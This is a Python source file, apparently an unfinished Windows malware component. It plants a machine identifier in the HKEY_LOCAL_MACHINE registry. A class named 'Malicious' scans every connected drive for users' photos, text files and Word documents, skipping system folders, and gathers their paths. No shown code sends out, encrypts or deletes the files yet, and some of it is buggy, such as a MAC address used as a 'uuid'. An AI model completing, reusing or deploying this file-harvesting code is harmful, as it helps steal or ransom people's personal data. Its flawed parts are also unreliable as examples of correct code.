import string
import os
import fnmatch
import uuid
import winreg

class Logging:

    def __init__(self) -> None:
        self.logfile_location = None
    
    def set_logging_location(self):
        # For this function I want it to be able to be to check size of log location left, and be able to log rotate. Maybe not all in this
        # function but defently in this class
        pass

class Computer:

    def __init__(self) -> None:
        self.agent_uuid = None
        self.possible_hives = ["HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE"]

    def get_uuid(self):
        # This function should first try to see if there is a uuid in registry and if not create one and pass it to the registry.
        hkey = "HKEY_LOCAL_MACHINE"
        subkey = "SOFTWARE\\Testing"
        try:
            uuid_key = self.open_registry_key(Key=subkey)
        except FileNotFoundError:
            self.create_registry_key(Key=subkey)
            uuid_key = self.open_registry_key(Key=subkey)
        uuid_value = uuid.getnode()
        winreg.SetValue(uuid_key, "uuid", winreg.REG_SZ, str(uuid_value))


    def get_registry_value(self, Hive, Key):
        for hive in self.possible_hives:
            if hive == Hive:
                registry_key_value = winreg.QueryValue(winreg.HKEY_LOCAL_MACHINE, Key)
                print(registry_key_value)
    
    def create_registry_key(self, Key):
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, Key)
    
    def open_registry_key(self, Key):
        key_obj = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, Key, reserved=0, access=winreg.KEY_ALL_ACCESS)
        return key_obj

class Malicious:

    def __init__(self) -> None:
        self.list_of_all_connected_drives = []
        self.important_file_extensions = [".jpg", ".txt", ".docx", ".png"]
        self.folders_to_exclude_in_data_collection = [r"c:\Windows\*", r"c:\Users\*\AppData\*", r"c:\Program Files\*", r"c:\Program Files (x86)\*", r"c:\ProgramData\*", \
            r"c:\Users\Public\*"]
        self.files_to_collect = []

    def find_all_important_files(self): 
        for drive in self.list_of_all_connected_drives:
            for root, dirs, files in os.walk(drive):
                for file in files:
                    for file_extension in self.important_file_extensions:
                        if (file.endswith(file_extension)):
                            full_file_path = os.path.join(root, file)
                            iteration_count = 0
                            iteration_max = len(self.folders_to_exclude_in_data_collection)
                            for folder_to_exclude in self.folders_to_exclude_in_data_collection:
                                iteration_count = iteration_count + 1
                                if fnmatch.fnmatch(full_file_path, folder_to_exclude):
                                    break
                                elif not fnmatch.fnmatch(full_file_path, folder_to_exclude) and iteration_count == iteration_max:
                                    self.files_to_collect.append(full_file_path)
                                elif not fnmatch.fnmatch(full_file_path, folder_to_exclude) and iteration_count != iteration_max:
                                    continue
                                else:
                                    print("I am not sure what happened here. But I am going to creat a logging function to handle stuff like this")                          

    def find_all_connected_drives(self):
        # I am not sure I like this method here. I really should put this in the Computer class but I need to find a way to pass the information to this class when it is created.
        all_lower_case_letters_list = list(string.ascii_lowercase)
        for letter in all_lower_case_letters_list:
            letter = letter + ":\\"
            does_drive_exist = os.path.isdir(letter)
            if does_drive_exist:
                if letter in self.list_of_all_connected_drives:
                    continue
                else:
                    self.list_of_all_connected_drives.append(letter)
                    

obj = Computer()
obj.get_uuid()